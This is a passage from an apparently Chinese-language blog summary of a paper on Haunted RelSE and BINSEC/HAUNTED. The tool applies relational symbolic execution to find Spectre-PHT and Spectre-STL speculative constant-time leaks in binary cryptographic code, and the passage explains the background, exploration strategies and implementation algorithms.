以探索临时路径，从而对推测性行为进行 <em>清晰地</em>  （explicitly）建模，而这导致了状态爆炸——尤其是对 Spectre-STL 而言。对符号执行的常数时间样式（constant-time-like）的属性的改造，称为  <em>关系符号执行</em>  （relational symbolic execution， RelSE），在二进制层面的可伸缩性与精度上已被证明是非常成功的</p><p>为了解决 C2，本文的核心技术是利用 RelSE 来  <em>在同一时间</em> 像常规执行（即，与正确的推测相关的执行） 那样执行临时的执行；本文将这种技术命名为 <code>Haunted RelSE</code>：</p><ul><li>对于 Spectre-PHT，其通过同时执行由条件语句产生的瞬态的与常规的路径以对多余状态进行剪枝</li><li>对于 Spectre-STL，其对多余状态进行剪枝并将剩余部分编码在一个单独的符号路径中，而非为每个可能的加载与存储交叉将符号执行进行分支</li></ul><p>本文在一个二进制层的关系符号分析工具 BINSEC&#x2F;HAUNTED 中应用 Haunted RelSE，为了进行评估，本文使用了 Spectre-PHT 的著名测试用例 Kocher ，以及一组为 Spectre-STL 提出的新测试用例，以及来自 donna、Libsodium 与 OpenSSL 库的真实世界密码学代码</p><p><strong>Findings.</strong> 本文的工作展示了一种用于对抗 Spectre-PHT 的著名防御手段 index-masking 可能会引入新的 Spectre-STL 漏洞，并提出且验证了用以解决这个问题的安全实现，通过本文的工具还发现了 GCC 中一个流行的用以生成位置无关代码（position-independent code）的选项可能引入 Spectre-STL 漏洞，同时还确认了由编译器添加的栈保护在密码原语（cryptographic primitives）中引入了 Spectre violations</p><p><strong>Contributions.</strong> 总结起来本文的工作就是：</p><ul><li>研究者设计了一种基于关系符号执行的技术，称之为 <code>Haunted Relse</code>，用以在符号分析中高效地分析推测执行，以检测 PHT 与 STL Spectre（Section III &amp; IV）；<code>Haunted Relse</code> 的基本思想是同时基于常规的与瞬态的行为进行符号化推断，尽管研究者对内存的编码让人联想到一些状态合并的编码，但实际上其遵循了不同的理论，通过防止常规与瞬态执行之间的人工阻断，而非试图将不同的路径（可能不相关）打包在一起；研究者正式证明了显式地对所有的推测路径建模进行关系分析与使用 Haunted Relse 在语义上等价（Section IV）</li><li>研究者提出了一种名为 <code>BINSEC/HAUNTED</code> 的验证工具，实现了 <code>Haunted Relse</code>，并通过著名的用于 spectre-PHT 的 litmus test 进行评估；研究者还进一步地提出一组用于 Spectre-STL 的 litmus test 且用其测试了 <code>BINSEC/HAUNTED</code>；试验的评估显示了 <code>BINSEC/HAUNTED</code> 可以在如 OpenSSL、donna、Libsodium 这样的真实世界的密码学代码中发现推测常数时间漏洞；对于 Spectre-PHT，<code>BINSEC/HAUNTED</code> 最多可以分析 5k 条静态指令，并比现有水平的  KLEESpectre 与 Pitchfork 更快（但精准度更低）；对于 Spectre-STL，其可以最多分析 100 条指令并在高达 6k 条指令的代码中找到漏洞；相比于 Pitchfork，<code>BINSEC/HAUNTED</code> 明显更快，且能找到更多的漏洞并报告更多的不安全程序</li><li>据研究者所知，其第一个报告了著名的用于对抗 Spectre-PHT 的防护 <code>index-masking</code> 有可能引入 Spectre-STL 漏洞；研究者提出了用以修复这个问题的正确实现（Section VI），并用其工具进行了验证；研究者同时还第一个报告了 GCC 编译器的 PIC 选项引入了 Spectre-STL 漏洞（Section VI）</li></ul><p><strong>Discussion.</strong> 当 Spectre attacks 开启了系统安全的新战场，对推测执行的思考变得困难且冗长，这需要自动搜索技术，但由于额外的推测行为引起的路径爆炸，此前的提案都存在可扩展性问题，<code>Haunted RelSE</code> 是向着可扩展的对 Spectre attacks 的分析迈出的一步；对于 Spectre-PHT，Haunted RelSE 可以在一些情况下提高分析速度，对分析推测语义的复杂性进行剪枝，并缩放于中等大小的真实世界中的密码学二进制文件；对于 Spectre-STL，其为第一个可以彻底分析小的真实世界密码学二进制文件的工具，并能在中等大小的真实世界密码学二进制文件中找到漏洞</p><h1 id="0x02-BACKGROUND"><a href="#0x02-BACKGROUND" class="headerlink" title="0x02. BACKGROUND"></a>0x02. BACKGROUND</h1><p>本节研究者提供了关于 Spectre 的基本背景：推测常数时间（speculative constant-time）与关系符号执行（relational symbolic execution）</p><p><strong>Spectre attacks.</strong> 在现代处理器中，只要指令的操作数可用，其被按顺序获取并存放在一个 <em>重排序缓冲区</em> （reorder buffer）中，且能按任意顺序执行；处理器同时使用<strong>推测</strong>（speculation）机制以在特定指令执行之前预测其输出，由误判带来的指令流——即 <em>瞬态执行</em> （transient execution）会被在架构级还原（例如恢复寄存器的值），但这可能遗留微架构级的侧面影响（例如 cache 的状态可能不会被恢复），而这些微架构级的侧面影响对程序是透明的，这使得攻击者可以进行侧信道攻击，<strong>幽灵攻击</strong>（Spectre attacks） 便是利用这种推测机制来触发这样的会在微架构级存储秘密数据的瞬态执行——称之为 <code>spectre gadgets</code>，这将被通过侧信道攻击进行复原</p><p>幽灵攻击一共有四种根据针对的机制的不同变种：</p><ul><li><code>Spectre-PHT</code>：对用以预测条件分支的 <code>Pattern History Table</code> 进行利用</li><li><code>Spectre-BHB</code>：对用以预测分支地址的 <code>Branch Target Buffer </code>进行利用</li><li><code>Spectre-RSB</code>：对用以预测返回地址的 <code>Return Stack Buffer </code>进行利用</li><li><code>Spectre-STL</code>：对用以预测 <code>Store-To-Load dependencies</code> 的消歧义机制进行利用</li></ul><p>对 BTB 与 RSB 变种的推测机制，可能会被误认为任意地址跳转，这对静态分析而言比较棘手（参见 Section VII），故研究者主要关注 Spectre-PHT 与 Spectre-STL</p><p><strong>Spectre-PHT.</strong> <code>Pattern History Table</code> 用以在微架构级预测条件分支的输出；我们首先介绍 Spectre 的变种 1，攻击者滥用分支预测器以故意在一个分支进行错误的推测；即使程序中的条件语句在架构级确保了内存访问的范围固定，攻击者可以引导 PHT 错误预测一个分支的值以瞬态执行一个越界内存访问，这在缓存中留下可以被观测到的且能被用以恢复越界读的数据的影响（Listing 1）</p><p><img src="https://s2.loli.net/2023/01/25/WZD6Vx1YTv3koiG.png" alt="Listing 1: Illustration of a Spectre-PHT attack."></p><p><strong>Spectre-STL.</strong> <code>Store-To-Load dependencies</code> 需要在所有的 store 指令完成执行前 load 指令不会执行，为了让 CPU 瞬态执行 store 指令并避免缓存未命中导致的暂停，store 指令以队列形式存放在一个 <code>store buffer</code> 中，而相较于等待先前的 store 指令完成，load 指令可以直接从匹配的带有 <em>store-to-load forwarding</em> 的 <code>store buffer </code> 中取值；此外，当内存消歧义器（memory disambiguator）预测到一个 load指令并非等待中的 store 的别名，其可以 <em>推测性地绕过在 store buffer 中等待中的 store</em> 并直接从主存取值；Spectre-STL 利用这种行为来载入会被编码于缓存中的包含秘密数据的旧值（Listing 2）</p><p><img src="https://s2.loli.net/2023/01/25/r7wLWqOlckJHzbK.png" alt="Listing 2: Illustration of a Spectre-STL attack."></p><p><strong>Speculative constant-time</strong>（SCT）. 常数时间（constant time）是密码学代码中一个流行的编程规范：程序不会存储、装载秘密数据值或是以其进行分支，以避免侧信道数据泄露；然而常数时间并不足以预防幽灵攻击，如 Listing 1 为一个常规的没有对秘密数据的访问或以其分支的常数时间程序，但该程序存在 Spectre-PHT 漏洞，攻击者可以误导式训练分支预测器并在瞬态执行中泄露秘密数据；推测常数时间是最近的一个扩展常数时间以考虑瞬态执行的安全属性</p><p><strong>Definition 1</strong>（Speculative constant-time）. 当且仅当一个程序的每一对（推测）执行有着相同的公共输入并协定了推测决策、且互相的控制流与内存访问都相等时，该程序关于推测常数时间是安全的。</p><p>需要注意的是 SCT（类似于常数时间与其他信息流属性）并非一个执行轨迹的属性，而与两个执行轨迹相关联，因此需要近似工具以高效地建模轨迹对</p><p><strong>Binary-level symbolic execution.</strong> 符号执行（Symbolic Execution）即使用符号输入执行程序，其会构建一个称为 <em>路径谓语</em> （path predicate）的逻辑表达式，用以保存在执行过程中遇到的分支条件；为了确认一条路径是否能通，路径谓语会被交给可满足性模理论求解器（SMT solver）进行求解；符号执行同时还能检查断言以寻找漏洞或是进行有界验证（即，在一个确定的深度下进行验证）</p><p>分析二进制代码通常采用将代码指令解码为一种低级的中间语言的形式，在二进制级的符号执行中的值（如寄存器、内存地址、内存内容等）为固定大小的符号位向量，内存被表示为一个用 32 位的位向量表示地址的符号字节数组，一个符号数组为一个通过如下操作将每个下标 <code>i ∈ I</code> 映射到对应值 <code>v ∈ V</code> 的函数（<code>Array I V</code>）：</p><ul><li><code>select</code>：<code>(Array I V) × I → V</code> 获取一个数组 <code>a</code> 与一个下标 <code>i</code>，返回一个存储在数组 <code>a</code> 的下标 <code>i</code> 的值 <code>v</code></li><li><code>store</code>：<code>(Array I V) × I × V → (Array I V)</code>  获取一个数组 <code>a</code> 、一个下标 <code>i</code> 与一个值 <code>v</code>，返回将下标 <code>i</code> 映射到值 <code>v</code> 的数组 <code>a</code></li></ul><p><strong>Relational Symbolic Execution.</strong> <code>关系符号执行</code>（RelSE）是一种有前景的将符号执行进行扩展以分析如 SCT 这样的两个执行路径的安全属性的方法，其符号化地在相同的符号执行实例中执行一个程序的两个版本并在其之间最大化共有部分；以分析常数时间为例，RelSE 让两个程序 <em>共享相同的公有输入</em> （public input），但使用不同的 <em>秘密输入</em>  （secret input），并在执行过程中检查是否条件分支的输出与内存下标在两个执行中必须一致——这代表其是否决定于秘密</p><p>在 RelSE 中，变量被映射到 <em>关系表达式</em> （relational expression）中，当其可能依赖于秘密数据时，其为一对符号表达式（表示为 <code>&lt;ϕl | ϕr&gt;</code> ），否则为一个简单的符号表达式（表示为 <code>&lt;ϕ&gt;</code> ）；为了对内存访问与条件指令进行安全评估，研究者使用如下定义的函数 <code>secLeak</code> 以确保一个关系表达式并不决定于秘密（即，表达式左右内容必须相等）：</p><p><img src="https://s2.loli.net/2023/01/27/mAty1adqCrk49UV.png" alt="image.png"></p><p><code>|=</code> 表示可满足（反之表示不满足），其依赖于这样一个事实：若 $\widehat{\varphi}$ 为一个简单的表达式，参照定义，其并不依赖于秘密，因而可以被安全地泄露；然而若 $\widehat{\varphi}$  为一对表达式  <code>&lt;ϕl | ϕr&gt;</code> ，仅当 <code>ϕl</code> 与 <code>ϕr</code> 在当前路径谓语 <code>π</code> 下不可被确认时（即表达式 <code>π ∧ ϕl ≠ ϕr</code> 不可被满足），泄露才是安全的</p><p><strong>Notations.</strong> 大小为 <code>n</code> 的符号位向量的集合表示为 <em>Bv<sub>n</sub></em> ，符号表达式（位向量或数组）  <em>ϕ, ϕl , ϕr, ψ, . . .</em>  的集合表示为 <code>Φ</code> ，关系表达式 $\widehat{\varphi}$，$\widehat{\psi}$, . . . 的集合表示为 <strong>Φ</strong> ， $\widehat{\varphi}$ 左、右的值表示为  $\widehat{\varphi _{|l}}$ 、$\widehat{\varphi _{|r}}$ ，若$\widehat{\varphi} &#x3D; \langle \varphi \rangle$ ，则  $\widehat{\varphi _{|l}}$ 、$\widehat{\varphi _{|r}}$ 都被定义为  $\widehat{\varphi}$ ，符号数组上的函数 <code>select</code> 与 <code>store</code> 的关系表达式为：</p><p><img src="https://s2.loli.net/2023/01/27/HVZc2jtCybDEUQh.png" alt="image.png"></p><h1 id="0x03-HAUNTED-RELSE"><a href="#0x03-HAUNTED-RELSE" class="headerlink" title="0x03. HAUNTED RELSE"></a>0x03. HAUNTED RELSE</h1><p>为了分析 SCT，我们需要修改 RelSE 以考虑程序的推测语义（speculative semantics），这包括 <em>常规表达式</em> ——被作为一个好的推测结果而执行的且会在推测被解决时保存的指令——以及所有可能的 <em>瞬态执行</em> ——被作为误测且会在推测解决时被丢弃的指令；本节描述解决这个问题的方法——在最新的工具中使用（参见 Table V）——研究者称之为 <em>Explicit</em> ，因为其直接建模了瞬态执行，并展现了研究者的优化探索策略，称之为 <em>Haunted</em></p><h3 id="A-Spectre-PHT"><a href="#A-Spectre-PHT" class="headerlink" title="A. Spectre-PHT"></a>A. Spectre-PHT</h3><p><em>1）Explicit RelSE for Spectre-PHT</em> ： <em>Explicit</em> 尝试通过符号执行建模 Spectre-PHT——于 KLEESpectre 中引入——通过将每个条件分支分成四个路径来直接地建模了瞬态执行；例如 <code>Fig.1a</code> 中的程序与 <code>Fig.1b</code> 中的该程序的符号执行树，在条件指令 <strong>if</strong> <code>c1</code> 后，执行将分成四个路径：</p><ul><li>两个 <em>常规路径</em> （regular path）：如同标准符号执行一般，第一个路径跟着 <code>then</code> 分支并将约束 <code>(c1 == true)</code> 添加到路径谓语中，第二条路径跟着 <code>else</code> 分支并将约束 <code>(c1 == false)</code> 添加到路径谓语中</li><li>两个 <em>瞬态路径</em> （transient path）：为了统计被误判到 <code>true</code> 的瞬态执行，<code>then</code> 分支被以约束 <code>(c1 == false)</code> 执行，为了统计被误判到 <code>false</code> 的瞬态执行，<code>else</code> 分支被以约束 <code>(c1 == true)</code> 执行；这些瞬态路径会在达到 <em>推测边界</em> （speculation bound，通常由重排序缓冲区的大小决定）后被丢弃</li></ul><p>为了验证 SCT，我们需要确认内存访问与条件状态是否在常规路径与瞬态路径上都没有泄露秘密信息；在常规路径上我们要确认程序的 <em>控制流</em> 与 <em>load 和 store 指令的下标</em> 并不决定于秘密输入，然而在瞬态路径上我们仅确认  <em>控制流</em> 与 <em>load 和 store 指令的下标</em>  ，因为在推测执行中，内存的 store 操作为 store buffer 中的队列，直到过期之前对缓存都不可见</p><p><em>Problem with Explicit</em> ：对于 <code>Fig. 1b</code>，我们看到两条子树都为常规执行与瞬态执行 <code>then</code> 分支的结果（即 子树起始于状态 <code>A</code> ），对应于不同路径谓语下的相同指令，准确地说，若我们将 $\widehat{\psi _{cf} }$ 、$\widehat{\psi _{ld} }$ 、$\widehat{\psi <em>{st}}$ 称为子树 <code>A</code> 中对应的 <em>控制流状态、 load 下标、store 下标</em> 的关系表达式，则对于常规执行我们需要检查 $seckeak(\pi \and c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{st}})$  ，对于瞬态执行我们需要检查 $seckeak(\pi \and \neg c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and \neg c</em>{1},\widehat{\psi _{ld}})$；最终等价于检查如下表达式：</p><p>$$<br>seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi _{st}})<br>$$</p><p>该表达式基本近似于在没有约束 <code>c1</code> 的情况下符号化地执行 <code>then</code> 分支至 $\delta$，检查 load 的下标 $\widehat{\psi _{ld} }$ 与控制流表达式 $\widehat{\psi _{cf} }$，仅将 <code>c1</code> 添加到 store 下标 $\widehat{\psi _{st} }$ 的检查中</p><p><em>这样的发现让研究者设计出来 Explicit RelSE 的优化方法：探索一个单独的同时包含程序的常规与瞬态行为的推测路径，以在保存一个等价结果的同时对状态进行剪枝</em></p><p><em>2）Haunted RelSE for Spectre-PHT</em>  ：相较于将执行分为四个路径，Haunted RelSE 仅将其分为两个路径，如 <code>Fig. 1c</code> 所示，在条件分支 <strong>if</strong> <code>c1</code> 之后，执行将分为两个路径：一个路径跟随 <code>then</code> 分支（子树 <code>A</code>），另一路径跟随 <code>else</code> 分支（子树 <code>B</code>），两个分支都同时对常规与相应的瞬态路径的行为进行建模；此外，其会延迟（可能免去）对路径约束的检查——仅会添加约束 $c _{1} \or \neg c _{1}$ ；最终，约束将会在条件分支失效后（在  $\delta$ 步后）被添加到路径谓语中</p><p>在每个条件状态 （或是 load 指令），研究者会检查条件（或是 load 下标）在常规执行与瞬态执行中都不依赖于秘密（即，使用路径谓语 π）：$seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi _{ld}})$ ；另一方面，store 指令仅会在常规执行下被检查（即，使用路径谓语 $\pi \and c _{1}$）；最终，条件 $(c1 &#x3D;&#x3D; true)$ 会被在  $\delta$ 步后被添加到路径谓语中</p><p><img src="https://s2.loli.net/2023/01/27/ba8tRJLwo6IzSnq.png" alt="Figure 1: Comparison of RelSE of program in Fig. 1a, where solid paths represent regular executions, dotted paths represent transient executions, and δ is the speculation depth."></p><h3 id="B-Spectre-STL"><a href="#B-Spectre-STL" class="headerlink" title="B.Spectre-STL"></a>B.Spectre-STL</h3><p><em>1) Explicit RelSE for Spectre-STL</em> ：在微架构级别，一个 load 指令可以从 store buffer 的任意匹配的 entry 或是从主存获取其值，这意味着 load 可以绕过 store buffer 中未决的 store 操作直到达到主存；为了统计这一行为， <em>Explicit</em> 策略——应用于 PITCHFORK 中——通过为每个可能的 load 与 store 交错进行符号执行分支以直接建模瞬态执行</p><p>考虑 <code>Fig.2a</code> 中的程序，对于 store 指令的符号执行给出 <code>Fig. 2b </code> 中定义的符号化内存 $\mu _{3}$，其为从 <code>initial_memory</code> 开始的一系列符号化 store 操作；有了这样按时间顺序的表示，我们可以很容易地用符号化内存中的最后 <code>|SB|</code> 次 store 操作来定义一个大小为 <code>|SB|</code> 的 store buffer；类似的，主存也可以通过移除符号化内存中的最后 <code>|SB|</code> 次 store 操作进行定义；以一个大小为 2 的 store buffer 为例，当主存由 $\mu _{1}$ 定义时，最后两次 store 构成了 store buffer</p><p>第一条 load 指令（block <code>A</code>）可以绕过 store buffer 中的每一个 store 操作直到其达到主存，因此 <code>x</code> 有三种可能的值，如 <code>Fig. 2c</code> 所示：</p><ul><li>常规值 $r$ 对应一个最近的符号化内存 $\mu _{3}$ 的符号化的 $select$ 操作，因为所有先前的 store 操作都被按顺序编码进了 $\mu _{3}$ ，这对应着顺序执行</li><li>第一个瞬态值 $t _{2}$ 通过绕过 store buffer 中的第一个 entry 而获得，这对应着 $\mu _{2}$ 中的一个符号化 $select$ 操作</li><li>最后一个瞬态值 $t _{1}$​ 通过绕过 store buffer 中的第一与第二个 entry 并从主存取值而获得，这对应着 $\mu _{1}$ 中的一个符号化 $select$ 操作</li></ul><p>类似地，变量 <code>y</code> 同样有三种可能的取值</p><p>如 <code>Fig. 2d </code> 中所示的 <em>Explicit</em> 探索策略为 load 的每个能获取的可能的值进行符号执行分支，这将很快导致路径爆炸，我们通过实验表明（Section V-C）即便是在较少代码上（100条指令）这个问题也很难解决</p><p><em>2) Haunted RelSE for Spectre-STL</em> ：研究者首先观察到大部分路径都是多余的，一个 load 可以通过先前的非别名 store 进行代偿，考虑 <code>Fig. 2c </code>中的评估，若我们能够确认 load 的下标 $a$ 与第二个 store 的下标 $a _{2}$ 不同，根据数组的定义，我们有 $t _{2} &#x3D; t _{1}$ ，由此路径 $x \to t _{2}$ 与其所有的子路径都是多余的； <em>研究者基于一种著名的称之为 read-over-write 的对符号数组的优化来检测与剪枝多余的情况</em> （cases）</p><p>然而，对多余情况的合并并不足以解决路径爆炸（参见 Section V），由此 <em>研究者提出一种新的编码以在一个单独的路径谓语中保存剩下的情况</em> ，其使用符号化的 <em>if-then-else</em> 来在一个单独的表示中编码所有可能被 load 取的值，而非为每个可能的情况进行分支执行</p><p>例如 <code>Fig. 2c</code> 中对 load 表达式的评估，在对第二个 load 的评估之后，变量 $y$ 可以取值 $r’,t’<em>{1},t’</em>{2}$，研究者引入两个新的布尔变量 $b’ <em>{1}$ 与 $b’ <em>{2}$ 并构建表达式 $(ite\ b’</em>{1}t’</em>{1}(ite\ b’<em>{2}t’</em>{2}r’))$，求解器可以让 $y$ 取如下值：</p><ul><li>瞬态值 $t’<em>{1}$ ，通过将 $b’</em>{1}$ 设为 true</li><li>瞬态值 $t’<em>{2}$ ，通过将 $b’</em>{1}$ 设为 false 且 $b’_{2}$ 设为 true</li><li>常规值 $r$，通过将 $b’<em>{1}$ 与 $b’</em>{2}$ 都设为 false</li></ul><p>最后，瞬态值  $t’<em>{1}$ （或是  $t’</em>{2}$） 可以简单地通过将  $b’<em>{1}$ （或是 $b’</em>{2}$）设为 false 来丢弃 </p><p><img src="https://s2.loli.net/2023/01/27/LK3SeluXqFkg5mb.png" alt="Figure 2: Speculative RelSE of program in Fig. 2a. The symbolic memory is given in Fig. 2b and the symbolic evaluation of load instructions is detailed in Fig. 2c. Figure 2d illustrates the symbolic execution tree obtained from the Explicit exploration strategy; and Fig. 2e, the tree obtained from Haunted RelSE, where solid paths denote regular executions and dotted paths denote transient executions."></p><h1 id="0x04-IMPLEMENTATION-OF-HAUNTED-RELSE"><a href="#0x04-IMPLEMENTATION-OF-HAUNTED-RELSE" class="headerlink" title="0x04. IMPLEMENTATION OF HAUNTED RELSE"></a>0x04. IMPLEMENTATION OF HAUNTED RELSE</h1><p>本节介绍 Haunted RelSE 的技术细节，主要关注于用以分析 SCT 的二进制级的 RelSE 的变化</p><p>由于对数据的依赖项的存在，大部分指令自然地执行或是不能被重排序，其实对于 Spectre-PHT 我们只需要考虑对条件分支的重排序（Section IV-A）并对 Spectre-STL 重排序 load 与 store 即可（Section IV-B）</p><p>一个表示为 $\sigma $ 的符号配置（symbolic configuration）由以下组成：</p><ul><li>当前位置 $l$ ，用以获取程序 $P$ 中的当前指令 $P[l]$</li><li>符号执行  $\delta $  的当前深度</li><li>一个符号寄存器映射 $\rho$ ，将程序变量映射到对应的符号值</li><li>两个路径谓语 $\pi$ 与 $\widetilde{\pi}$ （具体参见 Section IV-A）</li><li>一个符号化内存 $\widehat{\mu}$——一对符号数组、其 store 操作的 <em>过期深度</em> （retirement depth）</li><li>一组瞬态的 load $\widetilde{\lambda}$ （具体参见 Section IV-B）</li></ul><p>记号 $\sigma.f$ 表示配置 $\sigma$ 中的字段 $f$，研究者还定义了一个函数 $eval_expr(\sigma ,e)$ 用以在符号配置  $\sigma $  中计算一个 DBA 表达式 $e$ 到一个符号值</p><p>相比于直接对重排序缓冲区进行建模，研究者使用符号执行的 <em>当前深度</em> （current depth）来追踪要失效（retired）的指令，一条指令在至多 ∆ 步之后必须要退出，其中 ∆ 为重排序缓冲区的大小；表达式被附注了一个深度以确认其是否要退出，或是其是否依赖于内存，例如寄存器映射 $\rho$ 中的一个变量 $v$ 映射到一对 $(\widehat{\psi},\delta)$ ，其中 $\delta$ 为最近内存访问的失效深度（retirement depth），当 $\delta$ 不需要在上下文中时，其便被省略掉了</p><h3 id="A-Haunted-RelSE-for-Spectre-PHT"><a href="#A-Haunted-RelSE-for-Spectre-PHT" class="headerlink" title="A. Haunted RelSE for Spectre-PHT"></a>A. Haunted RelSE for Spectre-PHT</h3><p><em>1) Evaluation of conditional instructions</em> ：与标准的符号执行不同，条件并不会被立刻加入到路径谓语中，而是会与其退出深度一起被保存在一个 <em>推测路径谓语</em> （speculative path predicate） $\widetilde{\pi}$ 中；当达到一个条件的失效深度时，其会被从推测路径谓语中移除，添加到 <em>失效路径谓语</em> （retired path predicate） $\pi$ 中</p><p>对条件分支的评估如 <code>Algorithm 1</code> 所示，函数首先会评估条件的符号值并确认其可以被安全地泄露，之后其通过更新位置与推测路径谓语  $\widetilde{\pi}$  以沿着分支 <code>then</code>  计算后续状态 $\sigma _{t}$ 、沿着分支 <code>else</code> 计算后续状态 $\sigma _{f}$ </p><p><img src="https://s2.loli.net/2023/01/27/eAi2Hs3fFEqlK4w.png" alt="image.png"></p><p><em>2) Determining speculation depth</em> ：一个条件分支后的推测路径是动态计算的，考虑当其所依赖的所有内存访问都失效时，一个条件可以被完全解出（且预测错误的路径可以被去除），这意味着若该条件并不依赖于内存，则分支并未预测错误</p><p>这需要为每个表达式保存其最后内存访问的深度，如 <code>Algorithm 1</code> 所示，在一个条件分支上， $ite\ c\ ?l <em>{true}:l</em>{false}$ 被计算为一个符号值 $\widehat{\varphi}$ 与深度 $\delta$ ，该深度 $\delta$ 被作为条件的退出深度而添加到推测路径谓语  $\widetilde{\pi}$  中</p><p><em>3) Invalidate transient paths</em> ：在 <code>Algorithm 2</code> 中，条件分支在函数 $retirePHT(\pi,\widetilde{\pi},\delta)$ 中失效，该函数从推测路径谓语 $\widetilde{\pi}$ 中移除所有带有小于当前深度 $\delta _{current}$ 的失效深度 $\delta _{ret}$ 的条件，并将其添加到失效路径谓语 $\pi$ 中，并返回更新后的路径谓语  $\pi$ 与 $\widetilde{\pi}$ ；若  $\pi$ 不可满足，则符号执行将停止</p><p><img src="https://s2.loli.net/2023/01/27/tl29pvOeFdrBTGj.png" alt="image.png"></p><h3 id="B-Haunted-RelSE-for-Spectre-STL"><a href="#B-Haunted-RelSE-for-Spectre-STL" class="headerlink" title="B. Haunted RelSE for Spectre-STL"></a>B. Haunted RelSE for Spectre-STL</h3><p><em>1) Symbolic memory</em> ：在一个符号配置中，内存 $\widehat{\mu}$ 为从初始内存开始的符号化 store 操作的历史，我们可以使用这个按时间顺序的表示来重新构造 <em>store buffer</em> 与 <em>main memory</em> 的内容；store buffer 也是对符号化内存的最后 <code>|SB|</code> 条未失效 store 的限制，其中 <code>|SB|</code> 为 store buffer 的大小，形式上其被定义为：</p><p><img src="https://s2.loli.net/2023/01/27/Xt352nyMkC8R6vO.png" alt="image.png"></p><p>其中 $last(n,\widehat{\mu})$ 为符号化内存 $\widehat{\mu}$ 的最后 $n$ 个元素</p><p>类似地， <em>主存</em> （main memory）被定义为符号化内存堆失效的 store 操作的限制，形式上定义为 $Mem(\widehat{\mu},\delta)\triangleq\widehat{\mu}\backslash SB(\widehat{\mu},\delta)$</p><p>对一个 store 指令的评估如 <code>Algorithm 3</code> 所示，首先该函数会计算下标的符号值并确认其可以在 <em>常规路径谓语</em> $\pi _{reg}$ 下被安全地泄露（即，失效路径谓语 $\pi$ 与所有 $\widetilde{\pi}$ 中的未决的条件的结合，加上 $\lambda$ 中失效的 transient loads ），接下来其使用一个符号化的 store 操作来更新符号化内存并将该 store 的失效深度设为 $\delta + \Delta$，该失效深度用以确认 store buffer 中的哪一个 store 操作在等待中、哪一个已作用于主存上</p><p><img src="https://s2.loli.net/2023/01/28/HnTcajkiSudZODv.png" alt="image.png"></p><p><em>2) Evaluation of load expressions</em> ：load 表达式可以通过 <em>store-to-load forwarding</em> 从 store buffer 中获取一个带有匹配地址的未决的 store，也可以推测性地绕过 store buffer 中未决的 store 并从主存取值；相较于考虑一个 load 表达式与 store buffer 中先前所有的 store 之间的交织部分，研究者选用 <em>read-over-write</em> 来辨识与丢弃大部分的 load 与 先前的 store 自然地 commute 的情况； <em>Read-over-write</em> 为一个著名的对数组理论的简化，其在求解器之前解出了符号化数组的 select 操作</p><p>为了高效地对比下标，read-over-write 依赖于 <em>语法项等价性</em> （syntactic term equality），比较函数 $eq^{井} (i,j)$ 仅在 $i$ 与 $j$ 在语法上相等&#x2F;不等时返回 true&#x2F;false，若项之间无法进行比较，则为未定义，表示为 $⊥$</p><blockquote><p>公式里的这个 <code>#</code> 不懂为啥老是渲染错误，只能用 <code>井</code> 替代一下：( </p></blockquote><p>为了高效地在求解器之前解出 select 操作，read-over-write 定义了一个依赖于以下语法项等价性的 $lookup _{mem}$ 函数：</p><p><img src="https://s2.loli.net/2023/01/28/5t1P2KsjeJirdFz.png" alt="image.png"></p><p>其中 $\widehat{\mu _{n}} \triangleq store(\widehat{\mu} _{n-1} , j, \widehat{\varphi})$</p><p>例如考虑这样的一个内存 $\widehat{\mu}$ ：</p><p><img src="https://s2.loli.net/2023/01/28/s49Iic8LEz5hfO3.png" alt="image.png"></p><ul><li>$lookup _{mem}(\widehat{\mu},ebp - 8)$ 返回 $\widehat{\varphi}$</li><li>$lookup _{mem}(\widehat{\mu},ebp - 4)$ 首先会比较 $ebp - 4$ 与 $ebp - 8$ 并确认他们是 <em>语义不等的</em> （syntactically distinct，即 $\lnot eq^(ebp - 4, eax) &#x3D; \perp$），因此 $select$ 操作并不能被简化</li></ul><p>为了高效地建模 store-to-load forwarding，研究者定义了一个 <code>Algorithm 4</code>  中所示的新函数 $lookup _{SB}$，其返回 store buffer 中一组匹配的 store；此外，$lookup _{SB}$ 每个 load 必须要被失效化的深度，即对于相同地址的一个最近的 store 的失效深度</p><p><img src="https://s2.loli.net/2023/01/28/MKj5Ln9BG1xJ3IH.png" alt="image.png"></p><p>最终研究者定义了 <code>Algorithm 5</code> 中所示函数 $lookup _{ite} (\widehat{\mu},i,\widetilde{\lambda},\delta)$ ，其将 $lookup _{SB}$ 的结果编码为一个符号化的使用新的布尔变量的 if-then-else 表达式；该函数返回 load 表达式的值，并将过程中定义的布尔变量添加到 $\widetilde{\lambda}$ 中；此外，为了实现 $BINSEC&#x2F;HAUNTED$ ，研究者使用布尔变量的名字来编码关于 load 与前面的 store 的位置的信息；因此，我们有可能使用求解器返回的反例来得知触发漏洞是绕过了哪一个 store，这有助于我们了解漏洞并重构攻击图</p><p><img src="https://s2.loli.net/2023/01/28/Bq6ouwNsAkh2Ytz.png" alt="image.png"></p><p>对一个 load 指令的评估如 <code>Algorithm 6</code> 所示，首先该函数会计算下标的符号值并确认其可以被安全地泄露，接下来其会调用 $lookup _{ite}$ 获得 load 指令可以取的符号值的集合，编码为一个单独的 if-then-else 表达式 $\widehat{\iota}$ ，并更新 transient load 的集合 $\widetilde{\lambda}$ ；最后其会使用 load 的值更新寄存器映射并将其失效深度设为 $\delta + \Delta$ ；失效深度会在接下来的对条件分支的评估中使用，以确定该条件是否决定于内存</p><p><img src="https://s2.loli.net/2023/01/28/i2ous4LrlWd8vUg.png" alt="image.png"></p><p><em>3) Invalidate transient loads</em> ：当更多的最近的匹配的 store 都通过设置对应的布尔变量为 false 而失效了，transient load 的值可以被无效化；于 <code>Algorithm 7</code> 中定义的函数 $retireSTL(\pi,\widetilde{\lambda},\delta)$ 从 transient load 的集合 $\widetilde{\lambda}$ 中移除所有的带有在 $\delta$ 下的失效深度的 load，并在路径谓语 $\pi$ 中将相应的布尔变量设为 false；为了可读性，接下来我们引入一个通过同时使用 $retirePHT$ 与 $retireSTL$ 以停止所有推测的函数 $retireALL$ </p><p><img src="https://s2.loli.net/2023/01/28/7Nqnw9sDomUP4Qh.png" alt="image.png"></p><h3 id="C-Theorems"><a href="#C-Theorems" 